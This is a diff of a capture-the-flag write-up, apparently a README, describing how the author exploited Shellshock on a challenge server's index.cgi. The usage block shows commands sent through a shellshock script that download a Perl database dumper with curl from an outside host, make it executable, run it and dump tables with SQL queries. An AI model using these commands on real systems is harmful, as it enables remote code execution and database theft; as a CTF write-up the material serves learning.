@@ -21,9 +21,10 @@ I exploited shellshock on `index.cgi` to download the simple DB dumper I wrote. 
 
 Usage:
 ```
-geocities_shellshock.sh 'curl http://blabla/dumper.pl > /tmp/fuck.pl'
-geocities_shellshock.sh 'chmod +x /tmp/fuck.pl'
-geocities_shellshock.sh '/tmp/fuck.pl'
+geocities_shellshock.sh "curl http://blabla/dumper.pl > /tmp/fuck.pl"
+geocities_shellshock.sh "chmod +x /tmp/fuck.pl"
+geocities_shellshock.sh "/tmp/fuck.pl \"SHOW TABLES;\""
+geocities_shellshock.sh "/tmp/fuck.pl \"SELECT * FROM 47a6fd2ca39d2b0d6eea1c30008dd889;\""
 ```
 
 It was fun to see that a some people actually went beyond the scope of the CTF and left some "I was here" notes inside the source code of the website.
